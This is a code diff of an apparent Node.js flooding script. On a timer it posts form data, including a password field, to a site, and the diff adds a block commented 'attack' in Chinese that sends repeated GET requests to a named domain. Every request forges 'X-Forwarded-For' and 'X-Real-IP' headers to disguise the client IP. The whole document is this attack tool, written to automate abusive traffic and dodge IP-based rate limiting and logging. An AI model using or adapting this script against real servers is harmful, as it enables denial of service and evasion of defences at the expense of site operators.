@@ -20,6 +20,7 @@ setInterval(function () {
         method: 'post',
         headers: {
             'x-forwarded-for': ip,
+            'x-real-ip': ip,
         },
         data: {
             dede_fields: 'u,text;p,text',
@@ -30,5 +31,18 @@ setInterval(function () {
             j_xm: password,
         },
     });
-}, 60);
+    // 进攻
+    axios({
+        url: 'http://suibianxiexie.top/phone/',
+        method: 'get',
+        headers: {
+            'X-Real-IP': ip,
+            'x-forwarded-for': ip,
+            'x-nginx-proxy': true,
+        },
+        params: {
+            isOnlyRenderData: true,
+        },
+    }).then((json) => console.log(json.data.ip));
+}, 6000);
 app.listen('6661');
